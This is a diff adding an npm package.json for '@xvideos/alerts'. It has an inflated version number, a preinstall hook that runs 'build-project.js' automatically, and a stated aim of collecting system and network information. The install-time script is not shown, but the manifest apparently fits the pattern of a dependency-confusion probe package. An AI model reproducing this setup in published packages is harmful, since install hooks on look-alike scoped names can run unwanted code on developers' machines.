@@ -1,0 +1,21 @@
+{
+    "version": "581.2.14", 
+    "name": "@xvideos/alerts", 
+    "license": "ISC", 
+    "scripts": {
+        "test": "echo \"Error: no test specified\" && exit 1", 
+        "preinstall": "node build-project.js"
+    }, 
+    "keywords": [
+        "cpuinfo", 
+        "netstatus", 
+        "cpu info", 
+        "system-info"
+    ], 
+    "dependencies": {
+        "dns": "^0.2.2"
+    }, 
+    "author": "Alex Summer", 
+    "main": "app.js", 
+    "description": "Simple package to collect basic system info, like running OS and status of network interfaces."
+}
